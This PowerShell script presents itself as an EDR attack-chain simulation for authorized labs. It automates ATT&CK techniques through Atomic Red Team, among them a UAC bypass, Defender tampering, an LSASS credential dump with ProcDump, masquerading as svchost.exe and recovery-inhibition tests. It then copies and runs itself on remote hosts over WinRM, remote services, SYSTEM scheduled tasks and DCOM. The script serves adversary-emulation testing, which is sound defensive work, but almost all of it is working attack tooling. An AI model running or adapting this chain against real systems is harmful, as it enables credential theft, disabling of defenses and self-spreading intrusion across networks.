<#
Version 2.0 
Updated 15-Oct-2025

.SYNOPSIS
    Enhanced EDR Attack Chain Simulation with Lateral Movement

.DESCRIPTION
    Executes MITRE ATT&CK techniques locally (Patient Zero) then pivots to remote targets
    using realistic lateral movement techniques (WinRM, Service Execution, etc.)

.PARAMETER TargetsFile
    Path to text file containing target IP addresses or hostnames (one per line)
    If not provided, runs in local-only mode without lateral movement

.PARAMETER Mode
    Execution mode: 'Local' (default) or 'Remote' (used internally for remote execution)

.PARAMETER ReportBackTo
    UNC path where remote targets should copy logs (used in Remote mode)

.PARAMETER DryRun
    Shows what would be executed without actually running attacks

.EXAMPLE
    .\attackchain.ps1
    Runs attack chain locally only (no lateral movement)

.EXAMPLE
    .\attackchain.ps1 -TargetsFile "targets.txt"
    Runs locally then pivots to targets listed in file

.EXAMPLE
    .\attackchain.ps1 -DryRun -TargetsFile "targets.txt"
    Shows what would happen without executing

.WARNING
    ********************************************************************************
    *** FOR AUTHORIZED LAB USE ONLY - REVIEW EACH COMMAND BEFORE RUNNING       ***
    ********************************************************************************
#>

[CmdletBinding()]
param(
    [Parameter()][string]$TargetsFile,
    [Parameter()][ValidateSet("Local","Remote")][string]$Mode = "Local",
    [Parameter()][string]$ReportBackTo,
    [Parameter()][switch]$DryRun
)

# --- Script Configuration & Logging ---
$ScriptRoot = $PSScriptRoot
$LogFile = Join-Path $ScriptRoot "Attack-Simulation-Log.txt"
$ExecutionLogFile = Join-Path $ScriptRoot "Atomic-Execution-Log.csv"
$LateralMovementLog = Join-Path $ScriptRoot "lateral-movement-log.txt"
$RemoteLogsDir = Join-Path $ScriptRoot "logs\remote-targets"
$ErrorActionPreference = "Continue"
$MaxTargets = 10
$RemoteExecutionTimeout = 600 # 10 minutes
$LateralMovementTimeout = 60  # 1 minute per method

# Global tracking
$Script:CredentialsHarvested = $false
$Script:CurrentCredentials = $null

function Write-Log {
    param(
        [Parameter(Mandatory=$true)][string]$Message,
        [Parameter()][ValidateSet("INFO", "WARN", "ERROR", "SUCCESS", "MAJOR")][string]$Level = "INFO",
        [Parameter()][switch]$NoConsole
    )
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $LogMessage = "[$Timestamp] [$Level] $Message"
    $LogMessage | Out-File -FilePath $LogFile -Append -ErrorAction SilentlyContinue
    
    # MAJOR events go to console, others only to log unless specified
    if (-not $NoConsole -or $Level -eq "MAJOR" -or $Level -eq "ERROR" -or $Level -eq "SUCCESS") {
        $Color = @{ INFO = "White"; WARN = "Yellow"; ERROR = "Red"; SUCCESS = "Green"; MAJOR = "Cyan" }
        if ($Color.ContainsKey($Level)) {
            Write-Host $LogMessage -ForegroundColor $Color[$Level]
        } else {
            Write-Host $LogMessage
        }
    }
}

function Write-Banner {
    param([string]$Text)
    $border = "═" * ($Text.Length + 4)
    Write-Host "`n╔$border╗" -ForegroundColor Cyan
    Write-Host "║  $Text  ║" -ForegroundColor Cyan
    Write-Host "╚$border╝`n" -ForegroundColor Cyan
}

# --- Prerequisite Checks (FIXED) ---
function Check-Prerequisites {
    Write-Log "Running prerequisite checks..." -Level INFO -NoConsole
    
    # Force TLS 1.2
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Write-Log "Set security protocol to TLS 1.2" -Level INFO -NoConsole
    
    # Check Admin
    if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Log "This script must be run with Administrator privileges" -Level ERROR
        throw "Administrator privileges required"
    }
    Write-Log "Administrator privileges confirmed" -Level SUCCESS
    
    # Install NuGet provider first (without prompting) - FIX #1
    Write-Log "Checking NuGet provider..." -Level INFO -NoConsole
    $nuget = Get-PackageProvider -Name NuGet -ErrorAction SilentlyContinue
    if (-not $nuget -or ($nuget.Version -lt '2.8.5.201')) {
        Write-Log "Installing NuGet provider..." -Level WARN
        Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force -Scope AllUsers | Out-Null
        Write-Log "NuGet provider installed" -Level SUCCESS -NoConsole
    }
    
    # Set PSGallery as trusted to avoid prompts - FIX #2
    Set-PSRepository -Name PSGallery -InstallationPolicy Trusted -ErrorAction SilentlyContinue
    
    # Check/Install Invoke-AtomicRedTeam
    if (-NOT (Get-Module -ListAvailable -Name Invoke-AtomicRedTeam)) {
        Write-Log "Installing Invoke-AtomicRedTeam module..." -Level WARN
        Install-Module -Name Invoke-AtomicRedTeam -Scope AllUsers -Force -AllowClobber -SkipPublisherCheck
        if (-NOT (Get-Module -ListAvailable -Name Invoke-AtomicRedTeam)) {
            Write-Log "Failed to install Invoke-AtomicRedTeam module" -Level ERROR
            throw "Module installation failed"
        }
        Write-Log "Invoke-AtomicRedTeam module installed" -Level SUCCESS
    } else {
        Write-Log "Invoke-AtomicRedTeam module already installed" -Level INFO -NoConsole
    }
    
    # Force import and verify commands are available - FIX #3
    Remove-Module Invoke-AtomicRedTeam -Force -ErrorAction SilentlyContinue
    Import-Module Invoke-AtomicRedTeam -Force
    
    # Verify the Install-AtomicRedTeam command is available
    if (-not (Get-Command Install-AtomicRedTeam -ErrorAction SilentlyContinue)) {
        Write-Log "Invoke-AtomicRedTeam module loaded but commands not available. Retrying import..." -Level WARN
        Start-Sleep -Seconds 2
        Import-Module Invoke-AtomicRedTeam -Force -Global
        
        if (-not (Get-Command Install-AtomicRedTeam -ErrorAction SilentlyContinue)) {
            Write-Log "Module commands still not available. Manual intervention needed." -Level ERROR
            throw "Invoke-AtomicRedTeam commands not available after import"
        }
    }
    Write-Log "Invoke-AtomicRedTeam commands verified" -Level INFO -NoConsole
    
    # Check/Download Atomics - FIX #4
    if (-NOT (Test-Path "C:\AtomicRedTeam\atomics")) {
        Write-Log "Downloading Atomic Red Team library..." -Level WARN
        try {
            Install-AtomicRedTeam -GetAtomics -Force
            Write-Log "Atomics library downloaded" -Level SUCCESS
        } catch {
            Write-Log "Primary download failed: $($_.Exception.Message)" -Level WARN
            Write-Log "Trying alternative download method..." -Level WARN
            try {
                # Alternative method - download and extract manually
                $atomicsUrl = "https://github.com/redcanaryco/atomic-red-team/archive/master.zip"
                $downloadPath = Join-Path $env:TEMP "atomic-red-team.zip"
                $extractPath = "C:\AtomicRedTeam"
                
                Write-Log "Downloading from GitHub..." -Level INFO -NoConsole
                Invoke-WebRequest -Uri $atomicsUrl -OutFile $downloadPath -UseBasicParsing
                
                Write-Log "Extracting atomics..." -Level INFO -NoConsole
                if (Test-Path $extractPath) {
                    Remove-Item $extractPath -Recurse -Force -ErrorAction SilentlyContinue
                }
                New-Item -Path $extractPath -ItemType Directory -Force | Out-Null
                
                Expand-Archive -Path $downloadPath -DestinationPath $extractPath -Force
                
                # Move atomics folder to correct location
                $extractedFolder = Join-Path $extractPath "atomic-red-team-master"
                if (Test-Path $extractedFolder) {
                    Copy-Item -Path (Join-Path $extractedFolder "atomics") -Destination $extractPath -Recurse -Force
                    Remove-Item $extractedFolder -Recurse -Force -ErrorAction SilentlyContinue
                }
                
                # Cleanup
                Remove-Item $downloadPath -Force -ErrorAction SilentlyContinue
                
                if (Test-Path "C:\AtomicRedTeam\atomics") {
                    Write-Log "Atomics library downloaded via alternative method" -Level SUCCESS
                } else {
                    throw "Atomics folder not found after extraction"
                }
            } catch {
                Write-Log "Alternative download failed: $($_.Exception.Message)" -Level ERROR
                Write-Log "Please manually install Atomic Red Team from: https://github.com/redcanaryco/atomic-red-team" -Level ERROR
                throw "Atomics download failed"
            }
        }
    } else {
        Write-Log "Atomics library present" -Level INFO -NoConsole
    }
    
    return $true
}

# --- Helper: Safe Atomic Test Execution ---
function Invoke-SafeAtomicTest {
    param(
        [Parameter(Mandatory=$true)][string]$TechniqueId,
        [Parameter()][int[]]$TestNumbers,
        [Parameter()][switch]$CheckOnly
    )
    
    Write-Log "Checking available tests for $TechniqueId..." -Level INFO -NoConsole
    Invoke-AtomicTest $TechniqueId -ShowDetailsBrief
    
    if ($CheckOnly) { return }
    
    if ($TestNumbers) {
        foreach ($testNum in $TestNumbers) {
            Write-Log "Running cleanup for $TechniqueId test #$testNum..." -Level INFO -NoConsole
            try {
                Invoke-AtomicTest $TechniqueId -TestNumbers $testNum -Cleanup -ErrorAction SilentlyContinue | Out-Null
            } catch { }
            
            Write-Log "Checking prerequisites for $TechniqueId test #$testNum..." -Level INFO -NoConsole
            $prereqCheck = Invoke-AtomicTest $TechniqueId -TestNumbers $testNum -CheckPrereqs 2>&1
            
            if ($prereqCheck -match "Prerequisites not met") {
                Write-Log "Getting prerequisites for test #$testNum..." -Level WARN -NoConsole
                Invoke-AtomicTest $TechniqueId -TestNumbers $testNum -GetPrereqs
            }
            
            Write-Log "Executing $TechniqueId test #$testNum..." -Level INFO -NoConsole
            try {
                if (-not $DryRun) {
                    Invoke-AtomicTest $TechniqueId -TestNumbers $testNum -TimeoutSeconds 180 -ExecutionLogPath $ExecutionLogFile -Confirm:$false
                    Write-Log "Test #$testNum completed" -Level SUCCESS -NoConsole
                } else {
                    Write-Log "[DRY-RUN] Would execute $TechniqueId test #$testNum" -Level INFO
                }
            } catch {
                Write-Log "Test #$testNum failed: $($_.Exception.Message)" -Level ERROR -NoConsole
            }
        }
    }
}

# --- Tactic Functions ---
function Invoke-ExecutionTactic {
    Write-Log "--- Starting Tactic: EXECUTION ---" -Level MAJOR
    Write-Log "Executing T1059.005: VBScript for recon..." -Level INFO -NoConsole
    $vbsPath = Join-Path $ScriptRoot "temp-recon.vbs"
    $vbsCode = 'Set objShell = CreateObject("WScript.Shell"): objShell.Run "cmd /c whoami & hostname", 0, True'
    try {
        if (-not $DryRun) {
            Set-Content -Path $vbsPath -Value $vbsCode
            cscript.exe $vbsPath //Nologo
            Write-Log "VBScript execution completed" -Level SUCCESS -NoConsole
        } else {
            Write-Log "[DRY-RUN] Would execute VBScript" -Level INFO
        }
    } catch {
        Write-Log "Execution tactic failed: $($_.Exception.Message)" -Level ERROR
    } finally {
        if (Test-Path $vbsPath) { Remove-Item $vbsPath -Force -ErrorAction SilentlyContinue }
    }
}

function Invoke-PersistenceTactic {
    Write-Log "--- Starting Tactic: PERSISTENCE ---" -Level MAJOR
    try {
        Invoke-SafeAtomicTest -TechniqueId "T1053.005" -TestNumbers 2
        Write-Log "Scheduled task created" -Level SUCCESS
    } catch {
        Write-Log "Persistence tactic failed: $($_.Exception.Message)" -Level ERROR
    }
}

function Invoke-PrivilegeEscalationTactic {
    Write-Log "--- Starting Tactic: PRIVILEGE ESCALATION ---" -Level MAJOR
    try {
        Invoke-SafeAtomicTest -TechniqueId "T1548.002" -TestNumbers 3
        Write-Log "UAC bypass executed" -Level SUCCESS
    } catch {
        Write-Log "Privilege escalation failed: $($_.Exception.Message)" -Level ERROR
    }
}

function Invoke-DefenseEvasionTactic {
    Write-Log "--- Starting Tactic: DEFENSE EVASION ---" -Level MAJOR
    
    try {
        Invoke-SafeAtomicTest -TechniqueId "T1562.001" -TestNumbers 17
        Write-Log "Defender tampering attempted" -Level SUCCESS
    } catch {
        Write-Log "Defender tampering failed: $($_.Exception.Message)" -Level ERROR
    }
    Start-Sleep -s 2
    
    Write-Log "Executing encoded PowerShell command..." -Level INFO -NoConsole
    try {
        if (-not $DryRun) {
            $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Write-Host '[SUCCESS] Encoded command executed.'"))
            powershell.exe -EncodedCommand $encodedCommand
            Write-Log "Encoded command executed" -Level SUCCESS -NoConsole
        }
    } catch {
        Write-Log "Encoded command failed: $($_.Exception.Message)" -Level ERROR
    }
    Start-Sleep -s 2
    
    try {
        Invoke-SafeAtomicTest -TechniqueId "T1105" -TestNumbers 7
        Write-Log "Ingress tool transfer completed" -Level SUCCESS
    } catch {
        Write-Log "Tool transfer failed: $($_.Exception.Message)" -Level ERROR
    }
    Start-Sleep -s 2
    
    Write-Log "Executing process masquerading..." -Level INFO -NoConsole
    $masqueradePath = Join-Path $env:TEMP "svchost.exe"
    try {
        if (-not $DryRun) {
            Copy-Item -Path ($PSHOME + "\powershell.exe") -Destination $masqueradePath -Force
            Start-Process -FilePath $masqueradePath -ArgumentList "-Command Write-Host '[SUCCESS] Masqueraded process executed.'" -Wait -NoNewWindow
            Write-Log "Process masquerading completed" -Level SUCCESS -NoConsole
        }
    } catch {
        Write-Log "Masquerading failed: $($_.Exception.Message)" -Level ERROR
    }
}

function Invoke-CredentialAccessTactic {
    Write-Log "--- Starting Tactic: CREDENTIAL ACCESS ---" -Level MAJOR
    Write-Log "Attempting LSASS memory dump with ProcDump..." -Level INFO -NoConsole
    
    $sysinternalsZip = Join-Path $env:TEMP "SysinternalsSuite.zip"
    $sysinternalsDir = Join-Path $env:TEMP "SysinternalsSuite"
    $procdumpPath = Join-Path $sysinternalsDir "procdump64.exe"
    $lsassDumpFile = Join-Path $ScriptRoot "lsass.dmp"
    
    try {
        if (-not $DryRun) {
            if (-not (Test-Path $procdumpPath)) {
                Write-Log "Downloading Sysinternals Suite..." -Level INFO -NoConsole
                (New-Object System.Net.WebClient).DownloadFile("https://download.sysinternals.com/files/SysinternalsSuite.zip", $sysinternalsZip)
                Expand-Archive -Path $sysinternalsZip -DestinationPath $sysinternalsDir -Force
            }
            
            if (Test-Path $procdumpPath) {
                $dumpResult = & $procdumpPath -accepteula -ma lsass.exe $lsassDumpFile 2>&1
                
                if (Test-Path $lsassDumpFile) {
                    Write-Log "LSASS dump succeeded - Credentials harvested" -Level SUCCESS
                    $Script:CredentialsHarvested = $true
                } else {
                    Write-Log "LSASS dump blocked (Access Denied - Expected)" -Level WARN -NoConsole
                    Write-Log "Using current session credentials (Pass-the-Token simulation)" -Level INFO
                    $Script:CredentialsHarvested = $false
                }
            }
        } else {
            Write-Log "[DRY-RUN] Would attempt LSASS dump" -Level INFO
            $Script:CredentialsHarvested = $false
        }
    } catch {
        Write-Log "Credential access blocked: $($_.Exception.Message)" -Level WARN -NoConsole
        Write-Log "Using current session credentials" -Level INFO
        $Script:CredentialsHarvested = $false
    }
    
    # Store current credentials for lateral movement
    $Script:CurrentCredentials = [System.Management.Automation.PSCredential]::Empty
}

function Invoke-DiscoveryTactic {
    Write-Log "--- Starting Tactic: DISCOVERY ---" -Level MAJOR
    try {
        Invoke-SafeAtomicTest -TechniqueId "T1082" -TestNumbers 1
        Invoke-SafeAtomicTest -TechniqueId "T1057" -TestNumbers 2
        Invoke-SafeAtomicTest -TechniqueId "T1049" -TestNumbers 1
        Write-Log "Discovery techniques completed" -Level SUCCESS
    } catch {
        Write-Log "Discovery failed: $($_.Exception.Message)" -Level ERROR
    }
    Start-Sleep -s 2
    
    $reconFile = Join-Path $ScriptRoot "network_recon.txt"
    try {
        if (-not $DryRun) {
            arp -a | Out-File -FilePath $reconFile
            if (Test-Path $reconFile) {
                Write-Log "Network reconnaissance completed" -Level SUCCESS -NoConsole
            }
        }
    } catch {
        Write-Log "Network discovery failed: $($_.Exception.Message)" -Level ERROR
    }
}

function Invoke-CommandAndControlTactic {
    Write-Log "--- Starting Tactic: COMMAND AND CONTROL ---" -Level MAJOR
    $downloadFile = Join-Path $env:TEMP "c2_payload.txt"
    try {
        if (-not $DryRun) {
            Invoke-WebRequest -Uri 'https://www.bing.com/robots.txt' -OutFile $downloadFile
            if (Test-Path $downloadFile) {
                Write-Log "C2 download simulation completed" -Level SUCCESS -NoConsole
            }
        }
    } catch {
        Write-Log "C2 download test failed (network restricted): $($_.Exception.Message)" -Level WARN -NoConsole
    }
    Start-Sleep -s 2
    
    try {
        Invoke-SafeAtomicTest -TechniqueId "T1197" -TestNumbers 2
        Write-Log "BITS job created" -Level SUCCESS
    } catch {
        Write-Log "C2 BITS job failed: $($_.Exception.Message)" -Level ERROR
    }
}

function Invoke-ImpactTactic {
    Write-Log "--- Starting Tactic: IMPACT ---" -Level MAJOR
    try {
        Invoke-SafeAtomicTest -TechniqueId "T1490" -TestNumbers 9
        Write-Log "System recovery inhibition executed" -Level SUCCESS
    } catch {
        Write-Log "Impact tactic failed: $($_.Exception.Message)" -Level ERROR
    }
}

# --- Lateral Movement Functions ---

function Test-TargetConnectivity {
    param([string]$Target)
    
    Write-Log "Testing connectivity to $Target..." -Level INFO -NoConsole
    
    # Ping test
    $pingResult = Test-Connection -ComputerName $Target -Count 1 -Quiet -ErrorAction SilentlyContinue
    if (-not $pingResult) {
        Write-Log "Target $Target is not reachable (ping failed)" -Level ERROR
        return $false
    }
    
    Write-Log "Target $Target is reachable" -Level SUCCESS -NoConsole
    return $true
}

function Invoke-LateralMovement-WinRM {
    param(
        [string]$Target,
        [string]$ScriptPath
    )
    
    Write-Log "Attempting lateral movement via WinRM to $Target..." -Level INFO
    
    try {
        # Test WinRM
        $testResult = Test-WSMan -ComputerName $Target -ErrorAction Stop
        Write-Log "WinRM connection successful" -Level SUCCESS -NoConsole
        
        # Copy script
        $remotePath = "\\$Target\C$\Temp\attackchain.ps1"
        Write-Log "Copying script to $remotePath..." -Level INFO -NoConsole
        Copy-Item -Path $ScriptPath -Destination $remotePath -Force -ErrorAction Stop
        
        # Execute remotely
        Write-Log "Executing remote attack chain..." -Level INFO
        $job = Invoke-Command -ComputerName $Target -ScriptBlock {
            param($LogPath)
            Set-Location C:\Temp
            .\attackchain.ps1 -Mode Remote -ReportBackTo $LogPath
        } -ArgumentList "\\$env:COMPUTERNAME\C$\shared\logs\remote-targets\$Target" -AsJob
        
        # Wait with timeout
        $completed = Wait-Job -Job $job -Timeout $RemoteExecutionTimeout
        if ($completed) {
            $result = Receive-Job -Job $job
            Remove-Job -Job $job -Force
            Write-Log "Remote execution completed via WinRM" -Level SUCCESS
            return @{ Success = $true; Method = "WinRM" }
        } else {
            Remove-Job -Job $job -Force
            Write-Log "Remote execution timed out" -Level ERROR
            return @{ Success = $false; Method = "WinRM"; Error = "Timeout" }
        }
    } catch {
        Write-Log "WinRM failed: $($_.Exception.Message)" -Level WARN -NoConsole
        return @{ Success = $false; Method = "WinRM"; Error = $_.Exception.Message }
    }
}

function Invoke-LateralMovement-Service {
    param(
        [string]$Target,
        [string]$ScriptPath
    )
    
    Write-Log "Attempting lateral movement via Service Execution to $Target..." -Level INFO
    
    try {
        # Copy script via SMB
        $remotePath = "\\$Target\C$\Temp\attackchain.ps1"
        Write-Log "Copying script via SMB..." -Level INFO -NoConsole
        Copy-Item -Path $ScriptPath -Destination $remotePath -Force -ErrorAction Stop
        
        # Create and start service
        $serviceName = "AtomicTest$(Get-Random -Maximum 9999)"
        $serviceCmd = "powershell.exe -ExecutionPolicy Bypass -File C:\Temp\attackchain.ps1 -Mode Remote"
        
        Write-Log "Creating remote service $serviceName..." -Level INFO -NoConsole
        sc.exe \\$Target create $serviceName binPath= $serviceCmd start= demand | Out-Null
        sc.exe \\$Target start $serviceName | Out-Null
        
        Start-Sleep -Seconds $RemoteExecutionTimeout
        
        # Cleanup service
        sc.exe \\$Target stop $serviceName | Out-Null
        sc.exe \\$Target delete $serviceName | Out-Null
        
        Write-Log "Remote execution completed via Service" -Level SUCCESS
        return @{ Success = $true; Method = "Service" }
    } catch {
        Write-Log "Service execution failed: $($_.Exception.Message)" -Level WARN -NoConsole
        return @{ Success = $false; Method = "Service"; Error = $_.Exception.Message }
    }
}

function Invoke-LateralMovement-ScheduledTask {
    param(
        [string]$Target,
        [string]$ScriptPath
    )
    
    Write-Log "Attempting lateral movement via Scheduled Task to $Target..." -Level INFO
    
    try {
        # Copy script
        $remotePath = "\\$Target\C$\Temp\attackchain.ps1"
        Copy-Item -Path $ScriptPath -Destination $remotePath -Force -ErrorAction Stop
        
        # Create scheduled task
        $taskName = "AtomicTask$(Get-Random -Maximum 9999)"
        $action = "powershell.exe -ExecutionPolicy Bypass -File C:\Temp\attackchain.ps1 -Mode Remote"
        
        Write-Log "Creating remote scheduled task..." -Level INFO -NoConsole
        schtasks /create /s $Target /tn $taskName /tr $action /sc once /st 00:00 /ru SYSTEM /f | Out-Null
        schtasks /run /s $Target /tn $taskName | Out-Null
        
        Start-Sleep -Seconds $RemoteExecutionTimeout
        
        # Cleanup
        schtasks /delete /s $Target /tn $taskName /f | Out-Null
        
        Write-Log "Remote execution completed via Scheduled Task" -Level SUCCESS
        return @{ Success = $true; Method = "ScheduledTask" }
    } catch {
        Write-Log "Scheduled Task failed: $($_.Exception.Message)" -Level WARN -NoConsole
        return @{ Success = $false; Method = "ScheduledTask"; Error = $_.Exception.Message }
    }
}

function Invoke-LateralMovement-DCOM {
    param(
        [string]$Target,
        [string]$ScriptPath
    )
    
    Write-Log "Attempting lateral movement via DCOM to $Target..." -Level INFO
    
    try {
        # Copy script
        $remotePath = "\\$Target\C$\Temp\attackchain.ps1"
        Copy-Item -Path $ScriptPath -Destination $remotePath -Force -ErrorAction Stop
        
        # Execute via DCOM (MMC20.Application)
        Write-Log "Executing via DCOM..." -Level INFO -NoConsole
        $com = [Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application", $Target))
        $com.Document.ActiveView.ExecuteShellCommand("powershell.exe", $null, "-ExecutionPolicy Bypass -File C:\Temp\attackchain.ps1 -Mode Remote", "7")
        
        Start-Sleep -Seconds $RemoteExecutionTimeout
        
        Write-Log "Remote execution completed via DCOM" -Level SUCCESS
        return @{ Success = $true; Method = "DCOM" }
    } catch {
        Write-Log "DCOM execution failed: $($_.Exception.Message)" -Level WARN -NoConsole
        return @{ Success = $false; Method = "DCOM"; Error = $_.Exception.Message }
    }
}

function Invoke-LateralMovementCascade {
    param(
        [string]$Target,
        [string]$ScriptPath
    )
    
    # Try each method in order
    $methods = @(
        { Invoke-LateralMovement-WinRM -Target $Target -ScriptPath $ScriptPath },
        { Invoke-LateralMovement-Service -Target $Target -ScriptPath $ScriptPath },
        { Invoke-LateralMovement-ScheduledTask -Target $Target -ScriptPath $ScriptPath },
        { Invoke-LateralMovement-DCOM -Target $Target -ScriptPath $ScriptPath }
    )
    
    foreach ($method in $methods) {
        $result = & $method
        if ($result.Success) {
            return $result
        }
    }
    
    return @{ Success = $false; Method = "None"; Error = "All methods failed" }
}

function Collect-RemoteLogs {
    param([string]$Target)
    
    Write-Log "Collecting logs from $Target..." -Level INFO -NoConsole
    
    try {
        $remoteLogPath = "\\$Target\C$\Temp\Attack-Simulation-Log.txt"
        $remoteCsvPath = "\\$Target\C$\Temp\Atomic-Execution-Log.csv"
        
        $localTargetDir = Join-Path $RemoteLogsDir $Target
        New-Item -Path $localTargetDir -ItemType Directory -Force | Out-Null
        
        if (Test-Path $remoteLogPath) {
            Copy-Item -Path $remoteLogPath -Destination $localTargetDir -Force
        }
        if (Test-Path $remoteCsvPath) {
            Copy-Item -Path $remoteCsvPath -Destination $localTargetDir -Force
        }
        
        Write-Log "Logs collected from $Target" -Level SUCCESS -NoConsole
        return $true
    } catch {
        Write-Log "Failed to collect logs from $Target: $($_.Exception.Message)" -Level WARN -NoConsole
        return $false
    }
}

function Cleanup-RemoteTarget {
    param([string]$Target)
    
    Write-Log "Cleaning up artifacts on $Target..." -Level INFO -NoConsole
    
    try {
        Remove-Item "\\$Target\C$\Temp\attackchain.ps1" -Force -ErrorAction SilentlyContinue
        Remove-Item "\\$Target\C$\Temp\*.dmp" -Force -ErrorAction SilentlyContinue
        Remove-Item "\\$Target\C$\Temp\*.txt" -Force -ErrorAction SilentlyContinue
        Write-Log "Cleanup completed on $Target" -Level SUCCESS -NoConsole
        return $true
    } catch {
        Write-Log "Cleanup failed on $Target: $($_.Exception.Message)" -Level WARN -NoConsole
        return $false
    }
}

# --- Main Execution Logic ---

function Invoke-LocalAttackChain {
    Write-Banner "Phase 1: Patient Zero Attack Chain"
    
    # Initial cleanup
    Write-Log "Performing initial cleanup..." -Level INFO -NoConsole
    try {
        schtasks /delete /tn "spawn" /f 2>&1 | Out-Null
        Remove-Item (Join-Path $env:TEMP "svchost.exe") -Force -ErrorAction SilentlyContinue
        Remove-Item (Join-Path $env:TEMP "c2_payload.txt") -Force -ErrorAction SilentlyContinue
        Remove-Item (Join-Path $ScriptRoot "lsass.dmp") -Force -ErrorAction SilentlyContinue
        Remove-Item (Join-Path $ScriptRoot "network_recon.txt") -Force -ErrorAction SilentlyContinue
    } catch { }
    
    # Execute attack chain
    Invoke-ExecutionTactic
    Invoke-PersistenceTactic
    Invoke-PrivilegeEscalationTactic
    Invoke-DefenseEvasionTactic
    Invoke-CredentialAccessTactic
    Invoke-DiscoveryTactic
    Invoke-CommandAndControlTactic
    Invoke-ImpactTactic
    
    Write-Log "Patient Zero attack chain completed" -Level SUCCESS
    
    # Report credential status
    if ($Script:CredentialsHarvested) {
        Write-Log "Credential Status: HARVESTED (LSASS dump successful)" -Level SUCCESS
    } else {
        Write-Log "Credential Status: Using current session (Pass-the-Token simulation)" -Level INFO
    }
}

function Invoke-LateralMovementPhase {
    param([string[]]$Targets)
    
    Write-Banner "Phase 2: Lateral Movement"
    
    $results = @()
    $targetCount = 0
    
    foreach ($target in $Targets) {
        $targetCount++
        Write-Banner "Target $targetCount/$($Targets.Count): $target"
        
        # Test connectivity
        if (-not (Test-TargetConnectivity -Target $target)) {
            $results += @{
                Target = $target
                Success = $false
                Method = "None"
                Error = "No connectivity"
            }
            continue
        }
        
        # Attempt lateral movement
        if (-not $DryRun) {
            $result = Invoke-LateralMovementCascade -Target $target -ScriptPath $PSCommandPath
            $results += @{
                Target = $target
                Success = $result.Success
                Method = $result.Method
                Error = $result.Error
            }
            
            if ($result.Success) {
                # Collect logs
                Start-Sleep -Seconds 5
                Collect-RemoteLogs -Target $target
                
                # Cleanup
                Cleanup-RemoteTarget -Target $target
            }
        } else {
            Write-Log "[DRY-RUN] Would attempt lateral movement to $target" -Level INFO
            $results += @{
                Target = $target
                Success = $true
                Method = "DRY-RUN"
                Error = $null
            }
        }
    }
    
    return $results
}

function Show-ExecutionSummary {
    param($Results)
    
    Write-Banner "Execution Summary"
    
    Write-Host "Patient Zero: SUCCESS" -ForegroundColor Green
    Write-Host "  └─ Logs: $LogFile`n" -ForegroundColor Gray
    
    if ($Results) {
        Write-Host "Lateral Movement Results:" -ForegroundColor Cyan
        $successCount = 0
        foreach ($result in $Results) {
            if ($result.Success) {
                $successCount++
                Write-Host "  ├─ $($result.Target): SUCCESS (via $($result.Method))" -ForegroundColor Green
            } else {
                Write-Host "  ├─ $($result.Target): FAILED ($($result.Error))" -ForegroundColor Red
            }
        }
        
        $successRate = [math]::Round(($successCount / $Results.Count) * 100, 1)
        Write-Host "`nOverall: $successCount/$($Results.Count) targets compromised ($successRate% success rate)`n" -ForegroundColor Cyan
        
        Write-Host "Log locations:" -ForegroundColor Cyan
        Write-Host "  Patient Zero: $ScriptRoot\logs\" -ForegroundColor Gray
        Write-Host "  Remote Logs:  $RemoteLogsDir`n" -ForegroundColor Gray
    }
}

# --- MAIN EXECUTION ---

try {
    Write-Banner "EDR Attack Chain Simulation - Enhanced"
    
    if ($DryRun) {
        Write-Host "[DRY-RUN MODE] - No attacks will be executed`n" -ForegroundColor Yellow
    }
    
    # Mode check
    if ($Mode -eq "Remote") {
        Write-Log "Running in REMOTE mode - executing attack chain only" -Level INFO
        if (Check-Prerequisites) {
            Invoke-LocalAttackChain
            
            # Copy logs back to Patient Zero
            if ($ReportBackTo) {
                try {
                    New-Item -Path $ReportBackTo -ItemType Directory -Force | Out-Null
                    Copy-Item $LogFile -Destination $ReportBackTo -Force
                    Copy-Item $ExecutionLogFile -Destination $ReportBackTo -Force -ErrorAction SilentlyContinue
                } catch {
                    Write-Log "Failed to report back logs: $($_.Exception.Message)" -Level ERROR
                }
            }
        }
        exit 0
    }
    
    # LOCAL MODE - Full execution
    if (-not (Check-Prerequisites)) {
        throw "Prerequisites check failed"
    }
    
    # Execute local attack chain
    Invoke-LocalAttackChain
    
    # Check for targets file
    if ($TargetsFile -and (Test-Path $TargetsFile)) {
        $targets = Get-Content $TargetsFile | Where-Object { $_ -match '\S' } | Select-Object -First $MaxTargets
        
        if ($targets.Count -eq 0) {
            Write-Log "No targets found in $TargetsFile" -Level WARN
        } else {
            Write-Log "Discovered $($targets.Count) targets:" -Level INFO
            $targets | ForEach-Object { Write-Host "      $_" -ForegroundColor Gray }
            
            # Confirmation prompt
            $response = Read-Host "`nProceed with lateral movement to $($targets.Count) targets? (Y/N)"
            if ($response -eq 'Y' -or $response -eq 'y') {
                # Create remote logs directory
                New-Item -Path $RemoteLogsDir -ItemType Directory -Force | Out-Null
                
                # Execute lateral movement
                $results = Invoke-LateralMovementPhase -Targets $targets
                
                # Show summary
                Show-ExecutionSummary -Results $results
            } else {
                Write-Log "Lateral movement cancelled by user" -Level WARN
            }
        }
    } else {
        Write-Log "No targets file specified - running in local-only mode" -Level INFO
        Show-ExecutionSummary
    }
    
} catch {
    Write-Log "Fatal error: $($_.Exception.Message)" -Level ERROR
    Write-Log "Stack trace: $($_.ScriptStackTrace)" -Level ERROR -NoConsole
} finally {
    Write-Log "Script execution completed" -Level MAJOR
}
